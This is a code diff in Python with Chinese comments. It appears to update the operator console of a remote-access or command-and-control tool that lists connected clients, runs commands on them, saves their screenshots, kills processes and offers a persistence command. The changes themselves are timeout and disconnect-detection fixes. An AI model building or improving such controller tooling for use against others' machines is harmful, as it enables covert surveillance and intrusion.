@@ -129,7 +129,9 @@ DCYAN = "\033[2;96m"
 
 GRAY = "\033[90m"
 LGRAY = "\033[1;90m"
-timestamp = time.strftime("%Y%m%d_%H%M%S")
+
+def get_timestamp():
+    return time.strftime("%Y%m%d_%H%M%S")
 
 def clear_screen():
     """清屏"""
@@ -215,17 +217,36 @@ def get_results(client_id):
         resp = req("GET", f"/results/{client_id}")
         return resp.get("results", [])
     except Exception as e:
-        return [{"error": str(e)}]
+        # 返回空列表表示获取失败，而不应该立即视为客户端断线
+        return []
 
-def wait_for_result(client_id, timeout=0.8):
+def wait_for_result(client_id, timeout=1.5):  # 增加默认超时时间以适应较慢的命令
     """等待命令结果"""
     start_time = time.time()
     while time.time() - start_time < timeout:
-        results = get_results(client_id)
-        if results:
-            return results
+        try:
+            results = get_results(client_id)
+            if results:
+                return results
+        except:
+            # 即使请求出现一些暂时问题，也不要立即当作断线
+            pass
         time.sleep(0.02)
-    return None
+    return None  # 返回None表示没有结果（超时），由调用方决定是否认为客户端断线
+
+def check_client_online(client_id):
+    """检查客户端是否仍然在线，而不是依赖结果等待超时来判断"""
+    try:
+        # 请求客户端列表检查是否在线
+        connected_clients = req("GET", "/clients")
+        client_list = connected_clients.get("clients", [])
+        for client in client_list:
+            if client.get("id") == client_id:
+                return True
+        return False
+    except:
+        # 如果无法连接到服务器则假设客户端已离线
+        return False
 
 def print_failed_result(r):
     """打印错误结果"""
@@ -456,7 +477,7 @@ def interaction_loop(client_id, hostname):
                         try:
                             img_bytes = base64.b64decode(img_data)
                             os.makedirs("screenshots", exist_ok=True)
-                            save_path = os.path.join("screenshots", f"{client_id}_{timestamp}_{filename}")
+                            save_path = os.path.join("screenshots", f"{client_id}_{get_timestamp()}_{filename}")
                             with open(save_path, "wb") as f:
                                 f.write(img_bytes)
                             print(f"{LGREEN}[结果]{RESET} 截图已保存: {CYAN}{save_path}{RESET}")
@@ -473,20 +494,25 @@ def interaction_loop(client_id, hostname):
                 for r in results:
                     format_ls_output(r.get("result", []))
             else:
-                # 检测到客户端下线
-                print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
-                CURRENT_DEVICE = None
-                CURRENT_HOSTNAME = ""
-                print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
-                try:
-                    fetch_clients()
-                    if CLIENTS:
-                        print_clients()
-                    else:
-                        print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
-                except Exception as e:
-                    print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
-                return
+                # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
+                if not check_client_online(client_id):
+                    # 确认客户端真的不是在线的
+                    print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
+                    CURRENT_DEVICE = None
+                    CURRENT_HOSTNAME = ""
+                    print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
+                    try:
+                        fetch_clients()
+                        if CLIENTS:
+                            print_clients()
+                        else:
+                            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
+                    except Exception as e:
+                        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
+                    return
+                else:
+                    # 客户端仍然在线，只是命令执行时间较长
+                    print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
         elif cmd == "cd":
             if not arg:
                 print(f"{RED}[错误]{RESET} 用法: cd <目录>")
@@ -856,20 +882,25 @@ def interaction_loop(client_id, hostname):
                     for r in results:
                         print_failed_result(r)
                 else:
-                    # 检测到客户端下线
-                    print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
-                    CURRENT_DEVICE = None
-                    CURRENT_HOSTNAME = ""
-                    print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
-                    try:
-                        fetch_clients()
-                        if CLIENTS:
-                            print_clients()
-                        else:
-                            print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
-                    except Exception as e:
-                        print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
-                    return
+                    # 没有获取到结果，可能是命令执行时间长，所以我们先确认客户端是否真的掉线
+                    if not check_client_online(client_id):
+                        # 确认客户端真的不是在线的
+                        print(f"\n{RED}[警告]{RESET} {YELLOW}客户端 {hostname} 已下线{RESET}")
+                        CURRENT_DEVICE = None
+                        CURRENT_HOSTNAME = ""
+                        print(f"{LGREEN}[信息]{RESET} 更新设备列表...")
+                        try:
+                            fetch_clients()
+                            if CLIENTS:
+                                print_clients()
+                            else:
+                                print(f"{GRAY}[信息]{RESET} 暂无已连接的设备")
+                        except Exception as e:
+                            print(f"{RED}[错误]{RESET} 获取设备列表失败: {e}")
+                        return
+                    else:
+                        # 客户端仍然在线，只是命令执行时间较长
+                        print(f"{YELLOW}[信息]{RESET} 命令仍在执行，请稍候...")
             except ValueError:
                 print(f"{RED}[错误]{RESET} PID必须是有效整数")
         elif cmd in ("persist", "install"):
